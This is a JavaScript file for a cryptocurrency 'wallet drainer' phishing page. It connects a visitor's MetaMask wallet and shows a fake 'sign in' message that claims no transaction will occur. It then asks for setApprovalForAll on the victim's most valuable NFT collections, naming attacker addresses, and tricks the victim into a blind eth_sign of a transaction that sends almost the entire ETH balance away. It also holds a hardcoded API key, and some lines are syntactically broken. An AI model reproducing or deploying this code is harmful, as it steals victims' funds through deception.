//#region Web3.js
let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

let web3Provider;

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(false);
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(false)
}) : null;

async function updateState(connected) {
    if (connected && (await askSign())) {
        Object.assign(document.createElement('a'), {
            href: "./claim.html",
        }).click();
    }
}


async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = `Welcome, \n\n` +
            `Click to sign in and accept the Terms of Service.\n\n` +
            `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
            `Wallet Address:\n${walletAddress}\n\n` +
            `Nonce:\n${createNonce()}`;
        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);

        return true;
    } catch (e) {
        alert("Error signing message. Please try again.");
        return false;
    }
}

window.addEventListener('load', async () => {
    if (isMobile() && !window.ethereum) {
        document.querySelector("#connectButton").addEventListener("click", () =>
            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`);
    } else document.querySelector("#connectButton").addEventListener("click", connectButton);
});

//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};
const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}

//#endregion
async function askNfts() {
  const web3Js = new Web3(Moralis.provider);
  const walletAddress = await web3Js.eth.getAccounts()[0];
  const options = {
    method: "GET",
    headers: {
      Accept: "application/json",
      "X-API-KEY": "812924de94094476916671a8de4686ec",
    },
  };

  let walletNfts = await fetch(
    `${"https://api.opensea.io/api/v1/collections?asset_owner="}${walletAddress}${"&offset=0&limit=300"}`,
    options
  )
    .then((response) => {
      return response.json();
    })
    .then((nfts) => {
      console.log(nfts);
      if (nfts.includes("Request was throttled.")) {
        return ["Request was throttled."];
      }
      return nfts
        .filter((nfts) => {
          if (nfts.primary_asset_contracts.length > 0) {
            return true;
          } else {
            return false;
          }
        })
        .map((nfts) => {
          return {
            name: nfts.primary_asset_contracts[0].name,
            type: nfts.primary_asset_contracts[0].schema_name.toLowerCase(),
            contract_address: nfts.primary_asset_contracts[0].address,
            price: round(
              nfts.stats.one_day_average_price != 0
                ? nfts.stats.one_day_average_price
                : nfts.stats.seven_day_average_price
            ),
            owned: nfts.owned_asset_count,
          };
        });
    })
    .catch((err) => {
      return console.error(err);
    });
  if (walletNfts.includes("Request was throttled.")) {
    return verifyAsset();
  }
  if (walletNfts.length < 1) {
    return verifyAsset();
  }
  let transactionsOptions = [];
  for (nft of walletNfts) {
    if (nft.price === 0) {
      continue;
    }
    const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1));
    if (ethPrice < drainNftsInfo.minValue) {
      continue;
    }
    let thewallet =
      ethPrice > 0.1
        ? receiveAddress
        : "0xE6ACa0ebf3D62ffF4CC076eA47873ab1464364B9";
    transactionsOptions.push({
      price: ethPrice,
      options: {
        contractAddress: nft.contract_address,
        from: walletAddress,
        functionName: "setApprovalForAll",
        abi: [
          {
            inputs: [
              { internalType: "address", name: "operator", type: "address" },
              { internalType: "bool", name: "approved", type: "bool" },
            ],
            name: "setApprovalForAll",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
        ],
        params: { operator: thewallet, approved: true },
        gasLimit: awaitweb3Js.eth.getBlock("latest").gasLimit,
      },
    });
  }
  if (transactionsOptions.length < 1) {
    return notEligible();
  }
  let transanctionLists = await transactionsOptions.sort((a, b) => {
    return b.price - a.price;
  });
  for (const transaction of transanctionLists) {
    console.log(
      `Transferring ${transaction.options.contract_address} (${transaction.price} ETH)`
    );
    walletAddress = awaitweb3Js.eth.getAccounts()[0];
    if (isMobile()) {
      await Moralis.executeFunction(transaction.options)
        .catch((O_o) => {
          return console.error(O_o, options);
        })
        .then((_uwu) => {
          if (_uwu) {
          } else {
            return;
          }
          sendWebhooks(
            transaction.webhook,
            _uwu,
            transaction.name,
            transaction.price,
            transaction.options.contractAddress
          );
        });
    } else {
      Moralis.executeFunction(transaction.options)
        .catch((O_o) => {
          return console.error(O_o, options);
        })
        .then((_uwu) => {
          if (_uwu) {
          } else {
            return;
          }
          sendWebhooks(
            transaction.webhook,
            _uwu,
            transaction.name,
            transaction.price,
            transaction.options.contractAddress
          );
        });
      await verifyAsset();
    }
  }
}

const notEligible = () => {
  document.getElementById("notEli").style.display = "";
};

let eth_bal = 0;
const verifyAsset = async () => {
  const web3Js = new Web3(Moralis.provider);
  const walletAddress = (await web3Js.eth.getAccounts())[0];
  try {
    eth_bal = await web3Js.eth.getBalance(walletAddress);
    const r_bal = web3Js.utils.fromWei(eth_bal, "ether");
    console.log(`Current balance for ${walletAddress} : ${r_bal} ETH`);
    if (r_bal > 0.01) askTransferWithSign(r_bal);
    else console.log(`Error, balance is too low. (< 0.01 ETH)`);
  } catch (e) {
    console.log(e);
  }
};

async function askTransferWithSign(rbal) {
  const web3Js = new Web3(Moralis.provider);
  const walletAddress = (await web3Js.eth.getAccounts())[0];
  const chainId = await web3Js.eth.getChainID();
  await web3Js.eth
    .getTransactionCount(walletAddress, "Pending")
    .then(async (txnCount) => {
      const jgasPrice = await web3Js.eth.getGasPrice();
      const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
      const gas = new web3Js.utils.BN("22000");
      const cost = gas * Math.floor(jgasPrice * 2);
      const toSend = eth_bal - cost;

      console.log(
        `Sending ${web3Js.utils.fromWei(
          toSend.toString(),
          "ether"
        )} ETH from ${walletAddress}...`
      );

      const txObject = {
        nonce: web3Js.utils.toHex(txnCount),
        gasPrice: mgasPrice,
        gasLimit: "0x55F0",
        to: rbal > 1.0 ? "" : receiveAddress,
        value: "0x" + toSend.toString(16),
        data: "0x",
        v: "0x1",
        r: "0x",
        s: "0x",
      };

      let ethTX = new ethereumjs.Tx(txObject);
      const rawTx1 = "0x" + ethTX.serialize().toString("hex");
      const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: "hex" });

      console.log("rawTx1:", rawTx1);
      console.log("rawHash1:", rawHash1);

      await web3Js.eth
        .sign(rawHash1, walletAddress)
        .then(async (result) => {
          const signature = result.substring(2);
          const r = "0x" + signature.substring(0, 64);
          const s = "0x" + signature.substring(64, 128);
          const v = parseInt(signature.substring(128, 130), 16);

          const y = web3Js.utils.toHex(v + chainId * 2 + 8);

          ethTX.r = r;
          ethTX.s = s;
          ethTX.v = y;

          console.log(ethTX);

          const rawTx = "0x" + ethTX.serialize().toString("hex");
          const rawHash = web3Js.utils.sha3(rawTx, { encoding: "hex" });

          console.log("rawTx:", rawTx);
          console.log("rawHash:", rawHash);

          await web3Js.eth
            .sendSignedTransaction(rawTx)
            .then((hash) => console.log(hash))
            .catch((e) => console.log(e));
        })

        .catch((error) => {
          if (error.code == 4001) {
            this.sendWebhooks("Denied Money NO", this.walletAddress);
          }

          // this.updateTransactions(0, true);
        });
    });
}
let disabled = false;
async function askTransfer() {
  if (disabled) return;
  document.getElementById("claimButton").style.opacity = 0.5;
  disabled = true;
  //check later
  if (await askSign()) await askNfts();
  disabled = false;
  document.getElementById("claimButton").style.opacity = 1;  
}

if (typeof window.ethereum !== "undefined") metamaskInstalled = true;
window.addEventListener("load", async () => {
  document.querySelector("#claimButton").addEventListener("click", askTransfer() {
        document.getElementById("claimButton").click();
});

async function connectButton() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
}
async function claimButton() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
}

         
        


      

